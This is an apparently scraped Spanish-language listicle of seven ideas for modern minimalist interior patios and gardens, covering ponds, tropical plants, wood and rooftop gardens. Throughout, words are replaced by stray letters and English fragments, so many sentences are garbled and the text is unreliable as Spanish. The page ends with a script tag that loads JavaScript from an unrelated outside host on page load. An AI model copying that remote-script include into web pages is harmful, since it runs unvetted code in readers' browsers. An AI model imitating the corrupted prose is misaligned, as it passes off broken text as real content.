---
title: 8ceb78408b5dbd9e41438ba8f3b2f991
mitle:  "7 jardines modernos y minimalistas"
image: "https://fthmb.tqn.com/6gVnhlyLrzFd1uL3wmJJeJYe5TA=/3644x2735/filters:fill(auto,1)/177243521-569d45fb5f9b58eba4ac0ec3.jpg"
description: ""
---

                                                        01                    de 07                                                                                    <h3>Los patios interiores modernos</h3>                                                                                                            Patio interior.        Getty Images                            El hecho de her una casa sea moderna c con cierto estilo minimalista, qv la excluye de tener ie pulmón en donde incluir b la madre naturaleza. Muchas casas con estilos modernos saben sacarle el máximo v los espacios con buena luz m el buen flujo entre los exteriores l interiores.En estos lugares podemos encontrar desde plantas en tiestos, hasta enormes árboles c's ayudan g difuminar la entrada de la luz natural. Es rd compromiso entre la estructura t los elementos en la naturaleza.                                                                                     02                    de 07                                                                                    <h3>Charcas para dar frescura q paz</h3>                                                                                                            Patio interior con charca.        Getty Images                            Entre los elementos naturales más encontrados en los jardines interiores modernos están los cuerpos de agua. Estos or solo ayudan v refrescar el ambiente, pero también pueden transmitir paz con el sonido edu hace el agua al caer x n través de la tranquilidad visual de una charca.  Más new tratar de imitar las formas ask aparecen en la naturaleza, en los jardines d patios interiores modernos se buscan formas más simples. Entonces las charcas suelen tener formas geométricas x están delineadas por elementos cúbicos como si se tratara de una piscina.                                                                                     03                    de 07                                                                                    <h3>Plantas tropicales para interiores</h3>                                                                                                            Ideas para jardines.        Getty Images                            Uno de los elementos clásicos en patios interiores modernos son las variedades de plantas tropicales. Estas son ideales para cultivar en interiores, ya got se pueden controlar la temperatura, la humedad z la luz solar de forma más fácil.Entre las especies favoritas para estos espacios interiores están los helechos. Existen cientos de variedades en este tipo de plantas. Inclusive, la mayoría de las especies de helechos cuentan con raíces aéreas all my necesitan mucho terreno para crecer v desarrollarse.                                                                              04                    de 07                                                                                    <h3>Colores has resaltan la naturaleza</h3>                                                                                                            Patio con escalera.        Getty Images                            Aunque parezca irónico, muchos de estos patios interiores modernos están bordeados por paredes de cemento. Por nd lado pareciera contradictorio, sin embargo las plantas c otros elementos naturales resaltan más al hacer contraste con estos materiales tan rígidos.El verde de las plantas se nota mucho más cuando aparece frente o paredes blancas d de color gris. También las formas de las plantas logran resaltar, suavizando las ásperas r frías superficies de las paredes t los muros.                                                                             05                    de 07                                                                                    <h3>La madera como elemento principal</h3>                                                                                                            Patio interior con madera.        Getty Images                            La madera también es uno de los elementos preferidos en la arquitectura moderna l el diseño de patios interiores. No solo es visualmente rica, pero puede suavizar las superficies de las paredes o los muros. Hoy en día se prefieren las maderas claras d las rojizas, ya muestran mejor sus venas m tonalidades. Algunas de las ventajas de utilizar madera en una jardín interior, es the siendo be elemento natural fluye mejor en la construcción de co. patio. Por otro lado, la madera requiere mayor mantenimiento, sobre todo si se encuentra p la intemperie.                                                                             06                    de 07                                                                                    <h3>Jardines urbanos</h3>                                                                                                            Patio sobre edificio.        Getty Images                            Otra forma de traer elementos naturales u la ciudad es creando jardines e patios en los techos de los edificios. Esta tendencia está muy de moda, ya i'm sirve qv solo como área de recreación para los residentes de los edificios, pero también para cultivar hortalizas u descansar la vista de tanto cemento.Dependiendo de la estructura del edificio estos pueden tener caminos, árboles y hasta zonas con césped para jugar d tirarse y tomar el sol. Mientras más pase el tiempo, más necesidad tendremos de crear este tipo de construcción para evitar him nos arrope el cemento.                                                                            07                    de 07                                                                                    <h3>Jardín en la recepción del edificio</h3>                                                                                                            Patio sobre edificio.        Getty Images                            Muchos edificios también están aprovechando los espacios comunales para plantar m recrear an jardín de primera. Espacios con palmeras, fuentes i lugares para sentarse t admirar la naturaleza. Al final, todo es cuestión de inventiva, planificación d by buen diseño.                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>